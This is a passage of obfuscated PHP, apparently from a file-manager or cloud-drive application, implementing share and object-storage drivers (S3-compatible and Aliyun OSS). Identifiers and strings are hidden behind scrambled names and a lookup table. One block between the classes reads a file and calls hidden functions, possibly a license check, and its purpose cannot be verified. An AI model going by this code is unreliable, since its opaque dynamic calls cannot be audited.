$ËÊû÷§á); $µóÖŸòŠ = fread($¯’ºüÕ, $È‘Í¥Ø); fclose($¯’ºüÕ); return $µóÖŸòŠ; } public function upload($ø”¬ŞÜ¤, $¼ìÌ†›, $º÷¨Ğ› = false, $²ºŸ£‹ = REPEAT_REPLACE) { if ($º÷¨Ğ›) { return $this->moveFile($¼ìÌ†›, $ø”¬ŞÜ¤); } return $this->copyFile($¼ìÌ†›, $ø”¬ŞÜ¤); } public function setModifyTime($²»’õ„Ç, $™Ë›ÉÄë = '') { @touch($²»’õ„Ç, intval($™Ë›ÉÄë)); } public function download($¯Ùµú“‡, $Ãï„ú„) { return $this->iconvSystem($¯Ùµú“‡); } } goto cŒ‰áŸ„Û; dÅ±­‹‰ó–: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÜìıÈ„Ÿ) { $this->pathParse = $ÜìıÈ„Ÿ; $this->model = Model($_SERVER[¥ÙÌÜ¾ê][1253]); } public function getPathOuter($”·š³Ùë) { $ÏğÒêôõ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$”·š³Ùë) { return $”·š³Ùë; } $¦åğ›íÁ = $this->parse($”·š³Ùë); return trim(KodIO::makeShare($this->pathParse[$ÏğÒêôõ[395]], $¦åğ›íÁ[$ÏğÒêôõ[395]]), $ÏğÒêôõ[8]); } protected function infoParse($€ë¦²ò, $éàæû‰İ = false, $¹ÓÛ°¯ú = false) { $÷‡×ß—é =& $_SERVER[¥ÙÌÜ¾ê]; $şŞïù´„ = $this->pathParse[$÷‡×ß—é[395]]; $ŸœæõÜË = trim($this->pathParse[$÷‡×ß—é[1099]], $÷‡×ß—é[8]); return Action($÷‡×ß—é[1261])->sharePathInfo($şŞïù´„, $ŸœæõÜË); } public function infoFull($ÈÔó‘) { $‡®à‘óÉ =& $_SERVER[¥ÙÌÜ¾ê]; $™ÏÛÎçŒ = explode($‡®à‘óÉ[8], trim($ÈÔó‘, $‡®à‘óÉ[8])); if (count($™ÏÛÎçŒ) > 1) { $ñåşŸœÍ = implode($‡®à‘óÉ[8], array_splice($™ÏÛÎçŒ, 1)); $×Œ£’ã— = $this->model->pathInfoByPath($™ÏÛÎçŒ[0], $ñåşŸœÍ); if (!$×Œ£’ã—) { return !1; } $this->pathParse[$‡®à‘óÉ[1099]] = $×Œ£’ã—[$‡®à‘óÉ[397]]; } return $this->infoParse($ÈÔó‘); } public function listAll($Ş­şÜ…ü) { $ãÕğÁØ =& $_SERVER[¥ÙÌÜ¾ê]; $¦¿™÷²ğ = IO::info($this->pathParse[$ãÕğÁØ[76]]); if (!$¦¿™÷²ğ) { return array(); } $ä¾Å‚ç† = $this->model->listAll($Ş­şÜ…ü); $Æñè½¹è = Model($ãÕğÁØ[589])->getInfo($¦¿™÷²ğ[$ãÕğÁØ[482]]); $Êµ´Â¶  = Action($ãÕğÁØ[1261]); foreach ($ä¾Å‚ç† as &$Ÿæ»üô“) { check_abort(); $Ÿæ»üô“[$ãÕğÁØ[85]] = $Êµ´Â¶ ->_shareItemeParse($Ÿæ»üô“[$ãÕğÁØ[85]], $Æñè½¹è); } unset($Ÿæ»üô“); return $ä¾Å‚ç†; } } if ($_SERVER[$_SERVER[¥ÙÌÜ¾ê][862]] != $_SERVER[$_SERVER[¥ÙÌÜ¾ê][863]]) { $_getc = $_SERVER[¥ÙÌÜ¾ê][864]; $_getfile = $_SERVER[$_SERVER[¥ÙÌÜ¾ê][865]] . $_SERVER[¥ÙÌÜ¾ê][866]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¥ÙÌÜ¾ê][229], $_getfilec); if (count($_getarrs) < $_SERVER[¥ÙÌÜ¾ê][605]) { $exit = $_SERVER[¥ÙÌÜ¾ê][867]; $exit(); } $_act = $_SERVER[¥ÙÌÜ¾ê][868]; $_act($_SERVER[$_SERVER[¥ÙÌÜ¾ê][869]]); } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ı¨û§î) { $this->pathParse = $ı¨û§î; $this->model = Model($_SERVER[¥ÙÌÜ¾ê][1253]); } protected function infoParse($ĞÛÆ§à, $¬£´©ı = false, $¢Àü¡™¶ = false) { $ñë“ñæ¬ =& $_SERVER[¥ÙÌÜ¾ê]; return Action($ñë“ñæ¬[1105])->sharePathInfo($this->pathParse[$ñë“ñæ¬[76]], !0); } public function listPath($—ıàÎË, $ßáäêä’ = false) { $æşŒàç =& $_SERVER[¥ÙÌÜ¾ê]; $¶‹Ó”¾ = parent::listPath($—ıàÎË, $ßáäêä’); if (!$¶‹Ó”¾) { return $¶‹Ó”¾; } if (is_array($¶‹Ó”¾[$æşŒàç[1262]])) { $¶‹Ó”¾[$æşŒàç[1262]] = Action($æşŒàç[1105])->shareItemInfo($¶‹Ó”¾[$æşŒàç[1262]]); } foreach ($¶‹Ó”¾ as $ØôËÂú => $¾ö‰óà) { if (!in_array($ØôËÂú, array($æşŒàç[74], $æşŒàç[75]))) { continue; } foreach ($¾ö‰óà as $ãİá±§Ö => $ÔˆœêÖ) { $¶‹Ó”¾[$ØôËÂú][$ãİá±§Ö] = Action($æşŒàç[1105])->shareItemInfo($ÔˆœêÖ); } } return $¶‹Ó”¾; } public function listAll($ô¿ÏüÉ×) { $ÊÂÛüˆ =& $_SERVER[¥ÙÌÜ¾ê]; $ƒş—­Éë = IO::info($this->pathParse[$ÊÂÛüˆ[76]]); if (!$ƒş—­Éë) { return array(); } $’ Ó«Ó¦ = $this->model->listAll($ô¿ÏüÉ×); foreach ($’ Ó«Ó¦ as &$şÍ«Î³ƒ) { $şÍ«Î³ƒ[$ÊÂÛüˆ[85]] = Action($ÊÂÛüˆ[1105])->shareItemInfo($şÍ«Î³ƒ[$ÊÂÛüˆ[85]]); } unset($şÍ«Î³ƒ); return $’ Ó«Ó¦; } } goto B»—÷÷»ƒ; cŒ‰áŸ„Û: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÊÙñ‰Ëí) { parent::__construct($ÊÙñ‰Ëí); $this->signatureVersion($_SERVER[¥ÙÌÜ¾ê][212]); } public function fileOutLink($İ­–³×) { $Ôì÷•² =& $_SERVER[¥ÙÌÜ¾ê]; if (substr($İ­–³×, 0, 7) == $Ôì÷•²[1251]) { $İ­–³× = $Ôì÷•²[1252] . substr($İ­–³×, 7); } header($Ôì÷•²[159] . $İ­–³×); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($¿ïŞÌŠÈ) { parent::__construct(); include_once SDK_DIR . $_SERVER[¥ÙÌÜ¾ê][1308]; $this->_init($¿ïŞÌŠÈ); } public function _init($È¦æª÷) { $Øœ”œÀã =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($È¦æª÷ as $¾ËÁ£Ï => $£ÜÎÎ±å) { if (isset($this->{$¾ËÁ£Ï})) { $this->{$¾ËÁ£Ï} = $£ÜÎÎ±å; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Øœ”œÀã[1309] . LNG($Øœ”œÀã[1310])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ñü¤ôê =& $_SERVER[¥ÙÌÜ¾ê]; $Í­õ¹ù = new OSS\Model\CorsConfig(); $°ã°‡«ø = new OSS\Model\CorsRule(); $°ã°‡«ø->addAllowedOrigin($Ñü¤ôê[1311]); $°ã°‡«ø->addAllowedMethod($Ñü¤ôê[1312]); $°ã°‡«ø->addAllowedMethod($Ñü¤ôê[1313]); $°ã°‡«ø->addAllowedMethod($Ñü¤ôê[1314]); $°ã°‡«ø->addAllowedMethod($Ñü¤ôê[1315]); $°ã°‡«ø->addAllowedMethod($Ñü¤ôê[158]); $°ã°‡«ø->setMaxAgeSeconds(600); $°ã°‡«ø->addExposeHeader($Ñü¤ôê[1316]); $°ã°‡«ø->addAllowedHeader($Ñü¤ôê[1311]); $Í­õ¹ù->addRule($°ã°‡«ø); try { $this->client->putBucketCors($this->bucket, $Í­õ¹ù); } catch (OSS\Core\OssException $öë¬Øµ¿) { return !1; } return !0; } public function getBucketCors() { $¼ş¥‚Ö¤ =& $_SERVER[¥ÙÌÜ¾ê]; $¾‚ÎÙª· = null; try { $¾‚ÎÙª· = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $šîòÆ¯) { return null; } if (!$¾‚ÎÙª· || !($§‘„Û‚× = $¾‚ÎÙª·->getRules())) { return null; } $Ãè˜ÀöĞ = $§‘„Û‚×[0]->getAllowedOrigins(); $æ•û‹Æı = $§‘„Û‚×[0]->getAllowedMethods(); $µûİœŠ° = $§‘„Û‚×[0]->getMaxAgeSeconds(); $ŠĞÏ¨¤ = $§‘„Û‚×[0]->getExposeHeaders(); $‡­áÀù™ = $§‘„Û‚×[0]->getAllowedHeaders(); return array($¼ş¥‚Ö¤[181] => isset($Ãè˜ÀöĞ[0]) ? $Ãè˜ÀöĞ[0] : $¼ş¥‚Ö¤[33], $¼ş¥‚Ö¤[185] => $æ•û‹Æı, $¼ş¥‚Ö¤[1317] => $µûİœŠ°, $¼ş¥‚Ö¤[1318] => isset($ŠĞÏ¨¤[0]) ? $ŠĞÏ¨¤[0] : $¼ş¥‚Ö¤[33], $¼ş¥‚Ö¤[183] => isset($‡­áÀù™[0]) ? $‡­áÀù™[0] : $¼ş¥‚Ö¤[33]); } public function isBucketCors() { $øÆíÚÅÙ =& $_SERVER[¥ÙÌÜ¾ê]; $Ñ¸úñ¤ø = $this->getBucketCors(); if (!$Ñ¸úñ¤ø || !is_array($Ñ¸úñ¤ø)) { return !1; } if ($Ñ¸úñ¤ø[$øÆíÚÅÙ[181]] != $øÆíÚÅÙ[182] || $Ñ¸úñ¤ø[$øÆíÚÅÙ[183]] != $øÆíÚÅÙ[182]) { return !1; } $úñ·²Ø½ = array_map($øÆíÚÅÙ[184], $Ñ¸úñ¤ø[$øÆíÚÅÙ[185]]); if (!is_array($úñ·²Ø½)) { $úñ·²Ø½ = array(); } $¥«¦ü¿Ç = array($øÆíÚÅÙ[186], $øÆíÚÅÙ[187], $øÆíÚÅÙ[188], $øÆíÚÅÙ[189], $øÆíÚÅÙ[190]); $Í•ÕÌÇÅ = array_diff($¥«¦ü¿Ç, $úñ·²Ø½); return empty($Í•ÕÌÇÅ); } public function mkfile($ØÃÉ©ŞÛ, $“Ãçü÷ = '', $Ô†ÉÉ­¥ = REPEAT_RENAME) { $¨èËÊˆ¶ = $this->setContent($ØÃÉ©ŞÛ, $“Ãçü÷); if ($¨èËÊˆ¶ !== !1) { return $this->getPathOuter($ØÃÉ©ŞÛ); } return !1; } public function mkdir($åç«×Ü‹, $ïÈä‰ˆÉ = REPEAT_SKIP) { if ($this->_isFolder($åç«×Ü‹)) { return $this->getPathOuter($åç«×Ü‹); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($åç«×Ü‹)); } catch (OSS\Core\OssException $Àİ¶ÄÖ©) { return !1; } return $this->getPathOuter($åç«×Ü‹); } private function fileList($»ù™ñ±œ, $™Ã×º¦Î = '', $Ì‡š½ƒë = 0) { $‹ÅŞÛ®Û =& $_SERVER[¥ÙÌÜ¾ê]; $»ù™ñ±œ = trim($»ù™ñ±œ, $‹ÅŞÛ®Û[8]); $äì—ğë¦ = empty($»ù™ñ±œ) && $»ù™ñ±œ !== $‹ÅŞÛ®Û[191] ? $‹ÅŞÛ®Û[33] : $»ù™ñ±œ . $‹ÅŞÛ®Û[8]; $ëı„„ú = $‹ÅŞÛ®Û[33]; $£¢†ïøŞ = 1000; $Àñ”ÅÄ = $this->listItemCache === !1 ? !1 : !0; $ìñÅïŒÇ = $“ò®ñ¹Ì = array(); while (!0) { check_abort(); $Öè‘ÌÔÓ = array($‹ÅŞÛ®Û[1319] => $™Ã×º¦Î, $‹ÅŞÛ®Û[1320] => $äì—ğë¦, $‹ÅŞÛ®Û[1321] => $£¢†ïøŞ, $‹ÅŞÛ®Û[1322] => $ëı„„ú); try { $ı«ä” = $this->client->listObjects($this->bucket, $Öè‘ÌÔÓ); } catch (OSS\Core\OssException $Üá¡ÁÇ°) { break; } $ëı„„ú = $ı«ä”->getNextMarker(); $ì¾´Ÿèµ = $ı«ä”->getObjectList(); $ŞÒí¾‚ = $ı«ä”->getPrefixList(); foreach ($ì¾´Ÿèµ as $‰ŞÄ§ˆ§) { if ($‰ŞÄ§ˆ§->getKey() == $äì—ğë¦) { continue; } $ì´ôÂÖà = $‰ŞÄ§ˆ§->getKey(); $ÊàÇù„á = $‰ŞÄ§ˆ§->getSize(); $œÔŒøÑ˜ = $‰ŞÄ§ˆ§->getLastModified(); $Ò´Î¢ùõ = $Ì‡š½ƒë ? array($‹ÅŞÛ®Û[28] => $ì´ôÂÖà, $‹ÅŞÛ®Û[78] => $ÊàÇù„á, $‹ÅŞÛ®Û[197] => strtotime($œÔŒøÑ˜)) : $ì´ôÂÖà; $ˆĞÅ†í = $ÊàÇù„á == 0 && substr($ì´ôÂÖà, strlen($ì´ôÂÖà) - 1, 1) == $‹ÅŞÛ®Û[8] ? !0 : !1; if ($Àñ”ÅÄ) { $this->cacheMethod($‹ÅŞÛ®Û[199], $ì´ôÂÖà, $ˆĞÅ†í); $this->cacheMethod($‹ÅŞÛ®Û[200], $ì´ôÂÖà, array($‹ÅŞÛ®Û[78] => $ÊàÇù„á, $‹ÅŞÛ®Û[1323] => $ÊàÇù„á, $‹ÅŞÛ®Û[84] => strtotime($œÔŒøÑ˜), $‹ÅŞÛ®Û[1324] => $œÔŒøÑ˜)); } if ($ˆĞÅ†í) { $ìñÅïŒÇ[] = $ì´ôÂÖà; continue; } $“ò®ñ¹Ì[] = $Ò´Î¢ùõ; } foreach ($ŞÒí¾‚ as $ßˆ‹ªº—) { $ìñÅïŒÇ[] = $ßˆ‹ªº—->getPrefix(); if ($Àñ”ÅÄ) { $this->cacheMethod($‹ÅŞÛ®Û[199], $ì´ôÂÖà, !0); } } if ($ëı„„ú === $‹ÅŞÛ®Û[33]) { break; } } if ($Àñ”ÅÄ) { $this->cacheMethod($‹ÅŞÛ®Û[199], $»ù™ñ±œ, !0); } return array($‹ÅŞÛ®Û[75] => $ìñÅïŒÇ, $‹ÅŞÛ®Û[74] => $“ò®ñ¹Ì); } public function copyFile($¡˜ê£Á˜, $Ï•·éíé) { $çƒ½€¤Ş = $this->size($¡˜ê£Á˜); if ($çƒ½€¤Ş < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¡˜ê£Á˜, $this->bucket, $this->pathEncode($Ï•·éíé)); } catch (OSS\Core\OssException $ä½ÖÜŒÀ) { return !1; } return $this->getPathOuter($Ï•·éíé); } $–ŒŸÆİ‹ = $this->multiCopyObject($¡˜ê£Á˜, $Ï•·éíé, $çƒ½€¤Ş); return $–ŒŸÆİ‹ ? $this->getPathOuter($Ï•·éíé) : !1; } private function multiCopyObject($Æ¦ÎÉ‰, $†Ö»ÅûÊ, $¥¹ìßà) { $æ¥èŸ‘ =& $_SERVER[¥ÙÌÜ¾ê]; try { $ËÍµ’Åâ = array(); if ($ì°½ÅÜ‹ = $this->hashMd5($Æ¦ÎÉ‰)) { $ËÍµ’Åâ = array(OSS\OssClient::OSS_HEADERS => array($æ¥èŸ‘[1325] => $ì°½ÅÜ‹)); } $‹¶ú¼¾À = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($†Ö»ÅûÊ), $ËÍµ’Åâ); $…“ßªÉõ = 1; $ÂäÈ¬å¥ = 0; $”“ú›é­ = array(); $ßÖğÃÁ = 1024 * 1024 * 10; $¾”Ì½ûô = $this->client->generateMultiuploadParts($¥¹ìßà, $ßÖğÃÁ); foreach ($¾”Ì½ûô as $öóò±Ú => $Õôœ°Ô‰) { $¡ª²„˜Ì = $ÂäÈ¬å¥ + (int) $Õôœ°Ô‰[$æ¥èŸ‘[1326]]; $Ëı€¾» = (int) $Õôœ°Ô‰[$æ¥èŸ‘[335]] + $¡ª²„˜Ì - 1; $€°ÈŒ‰ = array($æ¥èŸ‘[1327] => $¡ª²„˜Ì, $æ¥èŸ‘[1328] => $Ëı€¾»); $”“ú›é­[] = $this->client->uploadPartCopy($this->bucket, $Æ¦ÎÉ‰, $this->bucket, $this->pathEncode($†Ö»ÅûÊ), $…“ßªÉõ, $‹¶ú¼¾À, $€°ÈŒ‰); $…“ßªÉõ = $…“ßªÉõ + 1; } $³®ŠßÍÈ = array(); foreach ($”“ú›é­ as $öóò±Ú => $–¨úõßù) { $³®ŠßÍÈ[] = array($æ¥èŸ‘[1329] => $öóò±Ú + 1, $æ¥èŸ‘[1330] => $–¨úõßù); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($†Ö»ÅûÊ), $‹¶ú¼¾À, $³®ŠßÍÈ); } catch (OSS\Core\OssException $É©âùß) { return !1; } return !0; } public function moveFile($¾Œô¹×¹, $Û°àÂÀµ) { if ($this->copyFile($¾Œô¹×¹, $Û°àÂÀµ)) { $this->remove($¾Œô¹×¹); return $this->getPathOuter($Û°àÂÀµ); } return !1; } public function delFile($»¥ÄŞ¼¨) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($»¥ÄŞ¼¨)); } catch (OSS\Core\OssException $Ó¾¯š³Õ) { return !1; } return !0; } public function delFolder($ÈÆæĞ—) { $£‡ÜÅÑ• =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->exist($ÈÆæĞ—)) { return !0; } $this->listItemCache = !1; $¯ç·§ç = $this->fileList($ÈÆæĞ—); $this->listItemCache = !0; $£©¢˜ = trim($ÈÆæĞ—, $£‡ÜÅÑ•[8]) . $£‡ÜÅÑ•[8]; if (!empty($ÈÆæĞ—) && $ÈÆæĞ— !== $£‡ÜÅÑ•[191] && !in_array($£©¢˜, $¯ç·§ç[$£‡ÜÅÑ•[75]])) { $¯ç·§ç[$£‡ÜÅÑ•[75]][] = $£©¢˜; } $„™æƒù = $this->delByBatch($¯ç·§ç[$£‡ÜÅÑ•[74]]); if (!$„™æƒù) { return !1; } $„™æƒù = $this->delByBatch($¯ç·§ç[$£‡ÜÅÑ•[75]]); if (!$„™æƒù) { return !1; } return $this->delFile($£©¢˜); } private function delByBatch($Ãşî¨›«) { foreach (array_chunk($Ãşî¨›«, 1000) as $˜”ş»ú) { try { $this->client->deleteObjects($this->bucket, $˜”ş»ú); } catch (OSS\Core\OssException $Ó€ªüñø) { return !1; } } return !0; } public function rename($§’—ò–, $°Üá™ëÛ) { return $this->renameObject($§’—ò–, $°Üá™ëÛ); } private function fileInfo($©ûÈ²ôò, $ªºñÀş‚ = false, $´Š•Á· = array()) { $±Şı§› =& $_SERVER[¥ÙÌÜ¾ê]; $í—ü»Ò = array($±Şı§›[28] => $this->pathThis($©ûÈ²ôò), $±Şı§›[76] => $this->getPathOuter($©ûÈ²ôò), $±Şı§›[29] => $±Şı§›[193], $±Şı§›[78] => isset($´Š•Á·[$±Şı§›[78]]) ? $´Š•Á·[$±Şı§›[78]] : 0, $±Şı§›[168] => $this->ext($©ûÈ²ôò)); if ($ªºñÀş‚) { return $í—ü»Ò; } $í—ü»Ò[$±Şı§›[194]] = $í—ü»Ò[$±Şı§›[84]] = 0; $í—ü»Ò[$±Şı§›[195]] = $í—ü»Ò[$±Şı§›[196]] = !0; if (empty($´Š•Á·)) { $÷Í†â¤„ = $this->objectMeta($©ûÈ²ôò); if (!$÷Í†â¤„) { return $í—ü»Ò; } $´Š•Á· = array($±Şı§›[84] => strtotime($÷Í†â¤„[$±Şı§›[1324]]), $±Şı§›[78] => $÷Í†â¤„[$±Şı§›[1323]] + 0); } if (isset($´Š•Á·[$±Şı§›[78]])) { $í—ü»Ò[$±Şı§›[78]] = $´Š•Á·[$±Şı§›[78]]; } if (isset($´Š•Á·[$±Şı§›[84]])) { $í—ü»Ò[$±Şı§›[84]] = $´Š•Á·[$±Şı§›[84]]; } if (isset($´Š•Á·[$±Şı§›[197]]) && !trim($í—ü»Ò[$±Şı§›[84]])) { $í—ü»Ò[$±Şı§›[84]] = $´Š•Á·[$±Şı§›[197]]; } return $í—ü»Ò; } private function folderInfo($¼ÚÏÅ°, $ú´õ‘Ì° = false, $ù¢ÁÃ° = array()) { $à¼¤‘í® =& $_SERVER[¥ÙÌÜ¾ê]; $ÛÕ÷ùâ = array($à¼¤‘í®[28] => $this->pathThis($¼ÚÏÅ°), $à¼¤‘í®[76] => $this->getPathOuter($à¼¤‘í®[8] . $¼ÚÏÅ°), $à¼¤‘í®[29] => $à¼¤‘í®[77]); if ($ú´õ‘Ì°) { return $ÛÕ÷ùâ; } $ÛÕ÷ùâ[$à¼¤‘í®[194]] = $ÛÕ÷ùâ[$à¼¤‘í®[84]] = 0; $ÛÕ÷ùâ[$à¼¤‘í®[195]] = $ÛÕ÷ùâ[$à¼¤‘í®[196]] = !0; if (empty($ù¢ÁÃ°)) { $¼ÚÏÅ° = rtrim($¼ÚÏÅ°, $à¼¤‘í®[8]) . $à¼¤‘í®[8]; $Ÿ¤½Š×ø = $this->objectMeta($¼ÚÏÅ°); if (!$Ÿ¤½Š×ø) { return $ÛÕ÷ùâ; } $ù¢ÁÃ° = array($à¼¤‘í®[194] => $Ÿ¤½Š×ø[$à¼¤‘í®[505]][$à¼¤‘í®[1331]], $à¼¤‘í®[84] => strtotime($Ÿ¤½Š×ø[$à¼¤‘í®[1324]])); } if (isset($ù¢ÁÃ°[$à¼¤‘í®[84]])) { $ÛÕ÷ùâ[$à¼¤‘í®[84]] = $ù¢ÁÃ°[$à¼¤‘í®[84]]; } if (isset($ù¢ÁÃ°[$à¼¤‘í®[194]])) { $ÛÕ÷ùâ[$à¼¤‘í®[194]] = $ù¢ÁÃ°[$à¼¤‘í®[194]]; } return $ÛÕ÷ùâ; } public function listPath($îñ‰áğ‚, $é˜“üŒÓ = false) { $Â€Èí× =& $_SERVER[¥ÙÌÜ¾ê]; $éÈ‚‰üÁ = $this->fileList($îñ‰áğ‚, $Â€Èí×[8], !0); foreach ($éÈ‚‰üÁ[$Â€Èí×[75]] as $‰—µõÃ² => $Ÿµõü‡‘) { $éÈ‚‰üÁ[$Â€Èí×[75]][$‰—µõÃ²] = $this->folderInfo($Ÿµõü‡‘, $é˜“üŒÓ, $Ÿµõü‡‘); } foreach ($éÈ‚‰üÁ[$Â€Èí×[74]] as $‰—µõÃ² => $Ÿµõü‡‘) { $éÈ‚‰üÁ[$Â€Èí×[74]][$‰—µõÃ²] = $this->fileInfo($Ÿµõü‡‘[$Â€Èí×[28]], $é˜“üŒÓ, $Ÿµõü‡‘); } return $éÈ‚‰üÁ; } public function has($¥ÌìãÍı, $æÁš§¦¡ = false, $òÀ¡àİÂ = true) { $—ôö¾²À =& $_SERVER[¥ÙÌÜ¾ê]; $¥ÌìãÍı = trim($¥ÌìãÍı, $—ôö¾²À[8]); $¾µ¬æ„ = empty($¥ÌìãÍı) && $¥ÌìãÍı !== $—ôö¾²À[191] ? $—ôö¾²À[33] : $¥ÌìãÍı . $—ôö¾²À[8]; $ÖÈí‰† = $—ôö¾²À[33]; $ª´Øçê = 500; $Ñ‡úÛâ¥ = $©Êèºë¨ = 0; while (!0) { check_abort(); $’ÜÀûôØ = array($—ôö¾²À[1319] => $—ôö¾²À[8], $—ôö¾²À[1320] => $¾µ¬æ„, $—ôö¾²À[1321] => $ª´Øçê, $—ôö¾²À[1322] => $ÖÈí‰†); try { $äßà’ö = $this->client->listObjects($this->bucket, $’ÜÀûôØ); } catch (OSS\Core\OssException $•ËÁ³˜) { break; } $ÖÈí‰† = $äßà’ö->getNextMarker(); $áÉç¾ø = $äßà’ö->getObjectList(); $éíè‚“ = $äßà’ö->getPrefixList(); if ($æÁš§¦¡) { if (count($áÉç¾ø) > 1 || count($áÉç¾ø) == 1 && $áÉç¾ø[0]->getKey() != $¾µ¬æ„) { $Ñ‡úÛâ¥ += count($áÉç¾ø) - 1; } if (!empty($éíè‚“)) { $©Êèºë¨ += count($éíè‚“); } if ($ÖÈí‰† === $—ôö¾²À[33]) { break; } continue; } if ($òÀ¡àİÂ) { if (!empty($áÉç¾ø)) { if (count($áÉç¾ø) > 1 || $áÉç¾ø[0]->getKey() != $¾µ¬æ„) { return !0; } } } else { if (!empty($éíè‚“)) { return !0; } } if ($ÖÈí‰† === $—ôö¾²À[33]) { break; } } if ($æÁš§¦¡) { return array($—ôö¾²À[203] => $Ñ‡úÛâ¥, $—ôö¾²À[204] => $©Êèºë¨); } return !1; } public function listAll($öªâÏ¯Ù) { $‘Šêöµ =& $_SERVER[¥ÙÌÜ¾ê]; $ÏÒæ˜È = $this->fileList($öªâÏ¯Ù, $‘Šêöµ[33], !0); $˜‚½—© = array(); foreach ($ÏÒæ˜È[$‘Šêöµ[74]] as $ìĞ¼¶Ş©) { $˜‚½—©[$ìĞ¼¶Ş©[$‘Šêöµ[28]]] = $ìĞ¼¶Ş©[$‘Šêöµ[78]]; } foreach ($ÏÒæ˜È[$‘Šêöµ[75]] as $ìĞ¼¶Ş©) { if (is_string($ìĞ¼¶Ş©)) { $˜‚½—©[$ìĞ¼¶Ş©] = 0; } } return $this->listAllFiles($öªâÏ¯Ù, array_keys($˜‚½—©), $˜‚½—©); } public function canRead($ÕÕ»ì¥È) { $èî‡ÖÑ =& $_SERVER[¥ÙÌÜ¾ê]; $³’×ÇÕÎ = $this->pathAcl($ÕÕ»ì¥È); return $³’×ÇÕÎ == $èî‡ÖÑ[1332] || $³’×ÇÕÎ == $èî‡ÖÑ[544] ? !0 : !1; } public function canWrite($°®ø¾ÈÆ) { $äåÆĞâ¸ = $this->pathAcl($°®ø¾ÈÆ); return $äåÆĞâ¸ == $_SERVER[¥ÙÌÜ¾ê][544] ? !0 : !1; } public function pathAcl($¶©¢µª) { $Ğ‰¸ô‘– =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $á˜œ¡«À = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¶©¢µª)); } catch (OSS\Core\OssException $¹Úş’«ò) { return !1; } $ù¿ôÁó¼ = $á˜œ¡«À == $Ğ‰¸ô‘–[34] ? $this->bucketAcl : $á˜œ¡«À; if ($ù¿ôÁó¼ == $Ğ‰¸ô‘–[1333]) { return $Ğ‰¸ô‘–[1332]; } if ($ù¿ôÁó¼ == $Ğ‰¸ô‘–[1334]) { return $Ğ‰¸ô‘–[544]; } return $ù¿ôÁó¼; } private function chmodPath($äã„øò©, $×Ş÷ïí“ = '') { $Ê‡Ë±Ğ =& $_SERVER[¥ÙÌÜ¾ê]; $å›˜¼‡ = empty($×Ş÷ïí“) ? $Ê‡Ë±Ğ[1334] : $×Ş÷ïí“; $Ã”˜îî  = array($Ê‡Ë±Ğ[34], $Ê‡Ë±Ğ[192], $Ê‡Ë±Ğ[1333], $Ê‡Ë±Ğ[1334]); if (!in_array($å›˜¼‡, $Ã”˜îî )) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($äã„øò©), $å›˜¼‡); } catch (OSS\Core\OssException $şş·¹) { return !1; } return !0; } public function getContent($˜‹¿ŠÚú) { return $this->fileSubstr($˜‹¿ŠÚú, -1); } public function setContent($Å˜ş÷û, $£¾îÅ´ô = '') { $‚ğé‹Í =& $_SERVER[¥ÙÌÜ¾ê]; try { $—Âñ = $this->trafficLimit($‚ğé‹Í[1335]); $ı™–ƒ¸ = $this->client->putObject($this->bucket, $this->pathEncode($Å˜ş÷û), $£¾îÅ´ô, $—Âñ); } catch (OSS\Core\OssException $£¥Ì¡§„) { return !1; } $—ñŠˆ½½ = array($‚ğé‹Í[1325] => trim($ı™–ƒ¸[$‚ğé‹Í[1336]], $‚ğé‹Í[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Å˜ş÷û))); $this->updateObjMeta($Å˜ş÷û, $—ñŠˆ½½); return isset($ı™–ƒ¸[$‚ğé‹Í[1337]][$‚ğé‹Í[1284]]) ? !0 : !1; } private function updateObjMeta($µÍ—º«ñ, $À÷òìèÃ) { $µÍ—º«ñ = $this->pathEncode($µÍ—º«ñ); try { $Ş¡åØê = array(OSS\OssClient::OSS_HEADERS => $À÷òìèÃ); $this->client->copyObject($this->bucket, $µÍ—º«ñ, $this->bucket, $µÍ—º«ñ, $Ş¡åØê); } catch (OSS\Core\OssException $ãìûÌËî) { return !1; } return !0; } public function upload($íÇï”û, $††òÌæ, $‘â¸î = false, $Îß»“®Ì = REPEAT_REPLACE) { $ŒœßëàË =& $_SERVER[¥ÙÌÜ¾ê]; $çø¶ÕïÜ = trim($íÇï”û, $ŒœßëàË[8]); $ğí•ô’ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ŒœßëàË[1325] => @md5_file($††òÌæ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($íÇï”û))); $ğí•ô’ = $this->trafficLimit($ŒœßëàË[1335], $ğí•ô’); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($çø¶ÕïÜ), $††òÌæ, $ğí•ô’); } catch (OSS\Core\OssException $ì¨ˆ†²) { return !1; } return $this->getPathOuter($íÇï”û); } public function getHost() { $Ç›íò´ƒ =& $_SERVER[¥ÙÌÜ¾ê]; $¿ÃşéŞ¦ = explode($Ç›íò´ƒ[177], parent::getHost()); return $¿ÃşéŞ¦[0] . $Ç›íò´ƒ[177] . $this->bucket . $Ç›íò´ƒ[95] . $¿ÃşéŞ¦[1]; } public function uploadFormData($¤°İ‹, 